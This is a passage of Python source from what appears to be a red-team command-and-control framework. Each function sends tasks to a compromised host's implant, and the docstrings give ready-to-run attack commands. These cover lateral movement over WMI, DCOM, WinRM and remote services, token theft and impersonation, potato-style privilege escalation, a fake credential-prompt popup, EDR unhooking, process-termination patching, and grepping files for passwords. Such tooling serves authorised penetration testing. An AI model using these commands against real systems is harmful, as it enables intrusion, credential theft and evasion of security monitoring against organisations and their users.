    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_sharpsc(user, command, implant_id, command_prefix=""):
    """
    Create a remote service to run your commands.

    https://github.com/djhohnstein/SharpSC

    MITRE TTPs:
        {}

    Examples:
        sharpsc SERVER01 service "cmd /c rundll32.exe test.dll,Ep" domain username password
        sharpsc action=create computername=dc01 service=MyService displayname=""My Service"" binpath=C:\\Windows\\System32\\cmd.exe
        sharpsc action=start</stop> computername=dc01 service=MyService
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_wmiexec(user, command, implant_id, command_prefix=""):
    """
    Uses WMI process_call_create to execute a command on the remote target.

    MITRE TTPs:
        {}

    Examples:
        wmiexec -t 10.0.0.1 -u admin -d domain -p password1 -c "rundll32 c:\\users\\public\\run.dll,etp"
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_arpscan(user, command, implant_id, command_prefix=""):
    """
    Performs an arp scan of the subnet.

    Optional DNS resolve flag.

    MITRE TTPs:
        {}

    Examples:
        arpscan 172.16.0.1/24 true
        arpscan <arp applicable subnet> <resolve true/false>
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_dcomexec(user, command, implant_id, command_prefix=""):
    """
    Uses DCOM for command execution.

    Requires correct token or ticket (cannot pass credentials).

    MITRE TTPs:
        {}

    Examples:
        dcomexec -t 10.0.0.1 -m mmc -c c:\\windows\\system32\\cmd.exe -a "/c notepad.exe"
        dcomexec -t 10.0.0.1 -m shellbrowserwindow -c c:\\windows\\system32\\cmd.exe -a "/c notepad.exe"
        dcomexec -t 10.0.0.1 -m shellwindows -c c:\\windows\\system32\\cmd.exe -a "/c notepad.exe"
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_sweetpotato(user, command, implant_id, command_prefix=""):
    """
    Abuses impersonation privilege to move from a service to SYSTEM.

    Consider PrintSpoofer and Juicy Potato also.
    Requires putting the Potato executable on disk - will require trivial obfuscation and recompilation.

    https://github.com/CCob/SweetPotato

    MITRE TTPs:
        {}

    Examples:
        sweetpotato -p c:\\users\\public\\implant.exe
        sharpps "rundll32.exe c:\\temp\\ph.dll,DllInstall" | out-file c:\\users\\public\\test3.bat -encoding ascii
        start-process C:\\Temp\\Juicy/<Sweet>Potato.exe "-l 2137 -p c:\\temp\\test3.bat -t *"
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_kill_process(user, command, implant_id, command_prefix=""):
    """
    Kills the specified procress by PID or processes matching a name.

    MITRE TTPs:
        {}

    Examples:
        kill-process
        kill-process 1234
        kill-process calc.exe
    """
    if command == "kill-process":
        pid = get_process_id(implant_id)
        ri = input(f"Are you sure you want to kill the current process? ({pid}) (Y/n) ")

        if ri == "" or ri.lower() == "y":
            command = f"{command} {pid}"
        else:
            print("Process not killed")
            return

    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_cred_popper(user, command, implant_id, command_prefix=""):
    """
    Cred pop the user with a customisable box (OS dependant).

    Make sure you are in a process at the foreground, otherwise the user won't see it!

    MITRE TTPs:
        {}

    Examples:
        cred-popper "Outlook" "Please Enter Your Domain Credentials"
        cred-popper "Putty" "Please re-enter your OTP code" "root@172.16.0.1"
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help, name="pwd")
def do_get_implant_working_directory(user, command, implant_id, command_prefix=""):
    """
    Gets the current working directory for the implant.

    MITRE TTPs:
        {}

    Examples:
        pwd
        get-implant-working-directory
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_get_computer_info(user, command, implant_id, command_prefix=""):
    """
    Performs situational awareness checks on the current host.

    Enumerates installed processes, users etc.

    MITRE TTPs:
        {}

    Examples:
        get-computer-info
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_unhooker(user, command, implant_id, command_prefix=""):
    """
    Unhooks any hooks applied to certain userland functions by EDRs.

    Currently supports:
        Windows 10 1507, 1511, 1607, 1703, 1709, 1803, 1809, 1903, 1909
        Windows 7 SP1
        Windows 2012 R2
        WIndows Server 2016

    Unhooks any hooks applied to:
        NtCreateProcessEx
        NtFreeVirtualMemory
        NtProtectVirtualMemory
        NtUnmapViewOfSection
        NtQueueApcThreadEx
        ZwCreateProcess
        ZwCreateThread
        ZwCreateThreadEx
        ZwCreateUserProcess
        ZwQueueApcThread

    MITRE TTPs:
        {}

    Examples:
        unhooker
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_sharpservice(user, command, implant_id, command_prefix=""):
    """
    Runs SharpService.exe to interact with local and/or remote services using ServiceController.

    MITRE TTPs:
        {}

    Arguments:
        sharpservice </name> [/machine] </action>

    Examples:
        sharpservice /name:Fax /action:check
        sharpservice /name:IKEEXT /machine:fs01.blorebank.local /action:start
    """
    check_module_loaded("SharpService.exe", implant_id, user, load_module_command=command_prefix)
    command = command.replace("sharpservice", "run-exe SharpService.Program SharpService")
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_steal_token(user, command, implant_id, command_prefix=""):
    """
    Steals a token from a process and applies it to the current thread. This token is then used for network access.

    Windows API Calls:
        * OpenProcessToken
        * DuplicateToken
        * ImpersonateLoggedOnUser
        * SetThreadToken
        * RevertToSelf

    MITRE TTPs:
        {}

    Arguments:
        steal-token <pid | rev2self>

    Examples:
        steal-token 9804
        steal-token rev2self
    """
    check_module_loaded("Steal_token.exe", implant_id, user, load_module_command=command_prefix)
    command = command.replace("steal-token", "run-exe Steal_token.Program Steal_token")
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_make_token(user, command, implant_id, command_prefix=""):
    """
    Makes a network logon token and applies it to the current thread.

    Windows API Calls:
        * GetTokenInformation
        * LogonUserA
        * ImpersonateLoggedOnUser
        * RevertToSelf

    MITRE TTPs:
        {}

    Arguments:
        make-token <username> <domain> <password>
        make-token rev2self

    Examples:
        make-token administrator blorebank.local P@ssw0rd!
        make-token rev2self
    """
    check_module_loaded("token.exe", implant_id, user, load_module_command=command_prefix)
    command = command.replace("make-token", "run-exe token.Program token")
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help, tags=[Tag.Process_Manipulation])
def do_sharpcreateproc(user, command, implant_id, command_prefix=""):
    """
    Runs SharpCreateProc.exe to create a suspended or running process, with or without alternate domain user credentials.

    Windows API Calls:
        * CreateProcess / CreateProcessWithLogonW
        * OpenThread
        * ResumeThread

    MITRE TTPs:
        {}

    Arguments:
        sharpcreateproc </proc> [/domain] [/username] [/password] [/suspended]
        sharpcreateproc </pid>

    Examples:
        sharpcreateproc /proc:C:\\Windows\\System32\\werfault.exe /domain:blorebank.local /username:admin /password:P@ssw0rd1 [/suspended]
        sharpcreateproc /proc:C:\\Windows\\System32\\werfault.exe
        sharpcreateproc /proc:C:\\Windows\\System32\\werfault.exe /suspended
        sharpcreateproc /pid:2222
    """
    check_module_loaded("SharpCreateProc.exe", implant_id, user, load_module_command=command_prefix)
    command = command.replace("sharpcreateproc", "run-exe SharpCreateProc.Program SharpCreateProc")
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help, tags=[Tag.Lateral_Movement])
def do_sharpwinrm(user, command, implant_id, command_prefix=""):
    """
    Uses WinRM (TCP/5985,5986) for command execution on a remote host. The underlying binary is SharpWSManRM from Bohops.

    https://github.com/bohops/WSMan-WinRM/blob/master/SharpWSManWinRM.cs

    MITRE TTPs:
        {}

    Arguments:
        sharpwinrm <hostname> [command] [domain\\user] [password]

    Examples:
        sharpwinrm dc01.blorebank.local "C:\\ProgramData\\edmgen.exe" domain\\joe.user Password123!  
    """
    check_module_loaded("SharpWSManRM.exe", implant_id, user, load_module_command=command_prefix)
    command = command.replace("sharpwinrm", "run-exe SharpWSManRM.Program SharpWSManRM")
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help, tags=[Tag.Enumeration])
def do_sharpprocesslist(user, command, implant_id, command_prefix=""):
    """
    Lists processes from a remote or local server via WTS API calls with RDP RPC method.
    (RDP needs to be enabled in the remote host)

    MITRE TTPs:
        {}

    Usage: sharpprocesslist [options]
        /domain    :  domain name for token
        /username  :  username for token
        /password  :  password for token
        /host      :  host for process listing

    Example:
        sharpprocesslist /host:127.0.0.1 /domain:whatever.local /username:darwin /password:P@ssw0rd1
        sharpprocesslist /host:10.0.0.5
    """
    check_module_loaded("SharpProcessList.exe", implant_id, user, load_module_command=command_prefix)
    command = command.replace("sharpprocesslist", "run-exe SharpProcessList.Program SharpProcessList")
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)



@command(commands, commands_help, examples, block_help, tags=[Tag.Enumeration])
def do_sharptask(user, command, implant_id, command_prefix=""):
    """
    Lists scheduled tasks from a remote or local server via API calls with RPC method.
    (RDP needs to be enabled in the remote host)

    MITRE TTPs:
        {}

    Arguments:
        --ListAll local \
        --ListAll remotehost.local \
        --GetRunning local
        --RemoveTask local \\ Test
        --AddTask local 12:30 \\ Test "Testing This Thing" C:\\Windows\\notepad.exe 
        --AddTask local 12:30 \\ Test "Testing This Thing" C:\\Windows\\system32\\cmd.exe "/c powershell -c BLAH"

    Examples:
        sharptask --listall local \\
        sharptask --addtask local 09:30 \\ TaskName "Task Description" C:\\Windows\\system32\\cmd.exe "/c mshta.exe" 
        sharptask --removetask local \\ Test
    """
    check_module_loaded("SharpTask.exe", implant_id, user, load_module_command=command_prefix)
    command = command.replace("sharptask", "run-exe SharpTask.Program SharpTask")
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)



@command(commands, commands_help, examples, block_help, tags=[Tag.Core])
def do_set_delegates(user, command, implant_id, command_prefix=""):
    """
    Sets the delegates (like function pointers) in Stage2-Core.exe.

    These delegates are set automatically usually, but if you force
    load Stage2-Core.exe again you may need to run this manually.

    The function pointers are used in Stage2-Core to perform certain
    actions, e.g. get-screenshot, download-file.

    MITRE TTPs:
        {}

    Example:
        set-delegates
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help, tags=[Tag.Enumeration])
def do_user_logons(user, command, implant_id, command_prefix=""):
    """
    Event log enumeration for sessions, requires elevation.

    Uses the C# EventLogSession class which uses the native EvtOpenSession (winevt.h / 	Wevtapi.dll) which uses RPC.

    MITRE TTPs:
        {}

    Arguments:
        user-logons [hostname] [domain] [username] [password]

    Examples:
        user-logons
        user-logons hostname.domain.local
        user-logons hostname.domain.local domain.local user1 password1
    """
    check_module_loaded("LoggedOnUsers.exe", implant_id, user, load_module_command=command_prefix)
    command = command.replace("loggedonusers", "run-exe LoggedOnUsers.Program LoggedOnUsers")
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help, tags=[Tag.Enumeration])
def do_grep(user, command, implant_id, command_prefix=""):
    """
    Greps in files on the local system.

    MITRE TTPs:
        {}

    Arguments:
        grep <path> <file mask> <grep> <recurse>

    Examples:
        grep C:\\temp *.config password= true
    """
    check_module_loaded("FileGrep.exe", implant_id, user, load_module_command=command_prefix)
    command = command.replace("filegrep", "run-exe FileGrep.Program FileGrep")
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help, tags=[Tag.Help])
def do_core_help(user, command, implant_id, command_prefix=""):
    """
    Prints the Stage2-Core help.

    MITRE TTPs:
        {}

    Arguments:
        core-help

    Examples:
        core-help
    """
    command = command.replace("core-help", "CoreHelp")
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help, tags=[Tag.Util])
def do_disable_environment_exit(user, command, implant_id, command_prefix=""):
    """
    Disables .NET's Environment.Exit() so that if any modules call it
    the implant will not die.

    MITRE TTPs:
        {}

    Arguments:
        disable-environment-exit

    Examples:
        disable-environment-exit
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help, tags=[Tag.Util])
def do_get_idle_time(user, command, implant_id, command_prefix=""):
    """
    Gets how long the target user has been idle.

    MITRE TTPs:
        {}

    Arguments:
        get-idle-time

    Examples:
        get-idle-time
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help, tags=[Tag.Util])
def do_echo(user, command, implant_id, command_prefix=""):
    """
    Echo the input.

    Used for testing arguments and output.

    MITRE TTPs:
        {}

    Arguments:
        echo <message>

    Examples:
        echo test
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help, tags=[Tag.Enumeration])
def do_net_share_enum(user, command, implant_id, command_prefix=""):
    """
    Enumerates shares on the target.

    Uses netapi32.dll NetShareEnum.

    MITRE TTPs:
        {}

    Arguments:
        net-share-enum <comma separated server list>

    Examples:
        net-share-enum hostname1,hostname2
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help, tags=[Tag.Enumeration])
def do_net_session_enum(user, command, implant_id, command_prefix=""):
    """
    Enumerates sessions on the target.

    Uses netapi32.dll NetSessionEnum.

    MITRE TTPs:
        {}

    Arguments:
        net-session-enum <comma separated server list>

    Examples:
        net-session-enum hostname1,hostname2
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help, tags=[Tag.Enumeration])
def do_local_group_member(user, command, implant_id, command_prefix=""):
    """
    Get the members of a local group on a target.

    Performs an WinNT GroupName Query.

    MITRE TTPs:
        {}

    Arguments:
        net-share-enum <server name> <group name>

    Examples:
        net-share-enum hostname1 administrators
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help, tags=[Tag.Enumeration])
def do_get_acl(user, command, implant_id, command_prefix=""):
    """
    Performs an ACL check on either a folder or file.

    MITRE TTPs:
        {}

    Arguments:
        get-acl <file or folder>

    Examples:
        get-acl C:\\temp
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help, tags=[Tag.Enumeration])
def do_file_access_time(user, command, implant_id, command_prefix=""):
    """
    Gets the timetamp that the file was last accessed.

    Performs an query using GetLastAccessTime.

    MITRE TTPs:
        {}

    Arguments:
        file-access-time <filename>

    Examples:
        file-access-time C:\\temp\\test.exe
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help, tags=[Tag.Enumeration])
def do_ldap_searcher(user, command, implant_id, command_prefix=""):
    """
    Performs an LDAP Query.

    MITRE TTPs:
        {}

    Arguments:
        ldap-searcher <query> <search root> [property] [resolve group names]

    Examples:
        ldap-searcher "(&(objectCategory=user)(samaccountname=user))"  "LDAP://bloredc1.blorebank.local/DC=blorebank,DC=local"
        ldap-searcher "(objectCategory=user)"  "LDAP://bloredc1.blorebank.local/DC=blorebank,DC=local" pwdlastset true
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help, tags=[Tag.Enumeration])
def do_ldap_searcher_recursive(user, command, implant_id, command_prefix=""):
    """
    Performs an LDAP Query, recursively retrieving group members.

    MITRE TTPs:
        {}

    Arguments:
        ldap-searcher-recursive <query> <search root> [property] [resolve group names]

    Examples:
        ldap-searcher-recursive "(&(objectCategory=user)(samaccountname=user))"  "LDAP://bloredc1.blorebank.local/DC=blorebank,DC=local"
        ldap-searcher-recursive "(objectCategory=user)"  "LDAP://bloredc1.blorebank.local/DC=blorebank,DC=local" pwdlastset true
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help, tags=[Tag.Util])
def do_get_screen_size(user, command, implant_id, command_prefix=""):
    """
    Gets the virtual screen size.

    Can be used with get-screenshot to specify bounds.

    MITRE TTPs:
        {}

    Arguments:
        get-screen-size

    Examples:
        get-screen-size
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help, tags=[Tag.Data_Gathering])
def do_get_screenshot_all_windows(user, command, implant_id, command_prefix=""):
    """
    Performs individual screenshots of all open windows.

    MITRE TTPs:
        {}

    Arguments:
        get-screenshot-all-windows

    Examples:
        get-screenshot-all-windows
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help, tags=[Tag.Enumeration])
def do_get_methods(user, command, implant_id, command_prefix=""):
    """
    Retrieves the publically available methods on the provided .NET assembly.

    MITRE TTPs:
        {}

    Arguments:
        get-methods <type name> <assembly name>

    Examples:
        get-methods Core.Program Core
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help, tags=[Tag.Process_Manipulation])
def do_kill_remote_process(user, command, implant_id, command_prefix=""):
    """
    Kills the process with the specified PID on the target.

    Uses WMI via .NET.

    MITRE TTPs:
        {}

    Arguments:
        kill-remote-process <pid> <hostname>

    Examples:
        kill-remote-process 1234 hostname1
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help, tags=[Tag.Lateral_Movement])
def do_invoke_daisy_chain(user, command, implant_id, command_prefix=""):
    """
    Used to start a new daisy server.

    MITRE TTPs:
        {}

    Arguments:
        invoke-daisy-chain <args>

    Examples:
        invoke-daisy-chain <args>
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help, tags=[Tag.Process_Manipulation])
def do_start_process(user, command, implant_id, command_prefix=""):
    """
    Start a new process or run a program, waiting for that process to terminate
    and capturing standard out and error.

    Uses .NET's System.Diagnostics.Process.

    MITRE TTPs:
        {}

    Arguments:
        start-process <binary> -argumentlist <args>

    Examples:
        start-process <binary> -argumentlist <args>
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help, tags=[Tag.Process_Manipulation])
def do_start_process_silent(user, command, implant_id, command_prefix=""):
    """
    Start a new process or run a program in the background.

    Uses .NET's System.Diagnostics.Process.

    MITRE TTPs:
        {}

    Arguments:
        start-process <binary> -argumentlist <args>

    Examples:
        start-process <binary> -argumentlist <args>
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help, tags=[Tag.Util, Tag.Filesystem])
def do_zip(user, command, implant_id, command_prefix=""):
    """
    Zips up a directory.

    MITRE TTPs:
        {}

    Arguments:
        zip <directory> <zip file>

    Examples:
        zip C:\\temp\\ C:\\users\\public\\temp.zip
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help, tags=[Tag.Util, Tag.Filesystem])
def do_unzip(user, command, implant_id, command_prefix=""):
    """
    Unzip an archive.

    MITRE TTPs:
        {}

    Arguments:
        unzip <zip file> <location>

    Examples:
        unzip c:\\temp\\test.zip c:\\temp\\
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help, tags=[Tag.Util, Tag.Filesystem])
def do_mkdir(user, command, implant_id, command_prefix=""):
    """
    Creates a directory.

    MITRE TTPs:
        {}

    Arguments:
        mkdir <dir>

    Examples:
        mkdir C:\\temp\\
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help, tags=[Tag.Util], name="cd")
def do_set_working_directory(user, command, implant_id, command_prefix=""):
    """
    Change the current working directory.

    MITRE TTPs:
        {}

    Arguments:
        cd <directory>

    Examples:
        cd C:\\temp
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help, tags=[Tag.Lateral_Movement])
def do_wmi_query(user, command, implant_id, command_prefix=""):
    """
    Used for running a generic WMI query.

    MITRE TTPs:
        {}

    Arguments:
        wmi-query <hostname> <wmi namespace> <query> [Username] [Domain] [Password]

    Examples:
        wmi-query hostname1 "root\\cimv2" "select * FROM Win32_Share"
        wmi-query hostname1 "root\\cimv2" "select * FROM Win32_Share" bob blorebank passw0rd
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help, tags=[Tag.Util])
def do_rmdir(user, command, implant_id, command_prefix=""):
    """
    Used for deleting a folder on the folder system.

    MITRE TTPs:
        {}

    Arguments:
        rmdir <path>

    Examples:
        rmdir C:\\temp\\
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help, tags=[Tag.Enumeration], name="env")
def do_get_environment_variables(user, command, implant_id, command_prefix=""):
    """
    Prints all environment variables.

    MITRE TTPs:
        {}

    Arguments:
        get-env

    Examples:
        get-env
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help, tags=[Tag.Enumeration])
def do_get_process(user, command, implant_id, command_prefix=""):
    """
    Looks for a specific process on the target system.

    MITRE TTPs:
        {}

    Arguments:
        get-process <name of process>

    Examples:
        get-process explorer.exe
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help, tags=[Tag.Util])
def do_dll_searcher(user, command, implant_id, command_prefix=""):
    """
    Lists which processes have loaded the provided DLLs.

    MITRE TTPs:
        {}

    Arguments:
        dll-searcher <dll1> <dll2> ...

    Examples:
        dll-searcher clr.dll mscoree.dll
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help, tags=[Tag.Azure_AD])
def do_get_aad_join_information(user, command, implant_id, command_prefix=""):
    """
    GetAadJoinInformation to return same output as dsregcmd /status.

    MITRE TTPs:
        {}

    Arguments:
        get-aad-join-information

    Examples:
        get-aad-join-information
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help, tags=[Tag.Enumeration])
def do_get_api_call(user, command, implant_id, command_prefix=""):
    """
    Gets the memory location of a DLL export in the current process.

    MITRE TTPs:
        {}

    Arguments:
        get-api-call <dll> <export>

    Examples:
        get-api-call ntdll.dll NtQueueApcThreadEx
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help, tags=[Tag.Enumeration])
def do_get_service_perms(user, command, implant_id, command_prefix=""):
    """
    Gets the service permissions of the host and outputs an HTML report
    on disk at the given location.

    MITRE TTPs:
        {}

    Arguments:
        get-service-perms <directory>

    Examples:
        get-service-perms C:\\temp\\
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help, tags=[Tag.Util])
def do_hook_terminate_process(user, command, implant_id, command_prefix=""):
    """
    Stop NtTerminateProcess & ZwTerminateProcess from exiting in NTDLL by patching the
    call in memory wth a ret.

    MITRE TTPs:
        {}

    Arguments:
        hook-terminate-process

    Examples:
        hook-terminate-process
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help, tags=[Tag.Util])
def do_get_dll_base_address(user, command, implant_id, command_prefix=""):
    """
    Get the sRDI DLL base address in memory.

    MITRE TTPs:
        {}

    Arguments:
        get-dll-base-address

    Examples:
        get-dll-base-address
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help, tags=[Tag.Memory_Manipulation])
def do_free_memory(user, command, implant_id, command_prefix=""):
    """
    Frees the allocation of the provided memory region.

    MITRE TTPs:
        {}

    Arguments:
        free-memory <address>

    Examples:
        free-memory 0x180000000
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help, tags=[Tag.Memory_Manipulation])
def do_remove_dll_base_address(user, command, implant_id, command_prefix=""):
    """
    Frees the sRDI DLL in memory.

    MITRE TTPs:
        {}

    Arguments:
        remove-dll-base-address

    Examples:
        remove-dll-base-address
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help, tags=[Tag.Enumeration], name="find")
def do_find_file(user, command, implant_id, command_prefix=""):
    """
    Searches for a file on the file system.

    Uses WMI CIM_DataFile.

    MITRE TTPs:
        {}

    Arguments:
        find-file <filename> <extension> [drive] [hostname]

    Examples:
        find-file flag txt c: 127.0.0.1
    """
    new_task = NewTask(
        implant_id=implant_id,
